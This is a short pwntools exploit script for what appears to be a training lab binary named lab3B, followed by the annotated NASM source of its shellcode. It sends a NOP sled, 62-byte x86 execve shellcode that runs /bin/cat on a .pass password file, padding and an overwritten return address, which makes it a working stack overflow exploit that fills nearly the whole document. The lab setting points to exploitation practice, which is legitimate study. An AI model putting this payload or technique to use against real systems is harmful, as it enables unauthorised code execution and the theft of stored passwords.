from pwn import *

p = gdb.debug("./lab3B")
p.recvline()
p.sendline("\x90"*8 + "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x31\x2f\x2e\x68\x54\x45\x4d\x50\x68\x6d\x61\x7a\x2f\x68\x2f\x6b\x61\x72\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80" + 78 * "\x90" + "h\xce\xff\xff")
p.interactive()


# SP offset of first 8B of the shellcode (start from  8 x NOP ) => 0xffffce68 <= EIP
# .pass is in the /home/karmaz/TEMP/1/.pass
# Shellcode
'''
; "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x31\x2f\x2e\x68\x54\x45\x4d\x50\x68\x6d\x61\x7a\x2f\x68\x2f\x6b\x61\x72\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
; Length:62

section .text
    global _start       ; For comipler, like int main()

_start:
    xor eax, eax        ; set eax to NULL and then push args in reverse order on the stack
    push eax            ; NULL - end of a string \x00
    push 0x7461632f     ; /cat
    push 0x6e69622f     ; /bin
    mov ebx, esp
    push eax            ; NULL
    push 0x73736170
    push 0x2e2f312f
    push 0x504d4554
    push 0x2f7a616d
    push 0x72616b2f
    push 0x656d6f68
    push 0x2f2f2f2f
    mov ecx, esp        ; set ecx as a string pointer ( as above with ebx, but now for "////home/karmaz/TEMP/1/.pass" )

    push eax
    push ecx
    push ebx
    mov ecx, esp        ; set array for execve()

    mov al, 0x0b        ; syscall 11 to al (8b) => execve()
    int 0x80            ; syscall
'''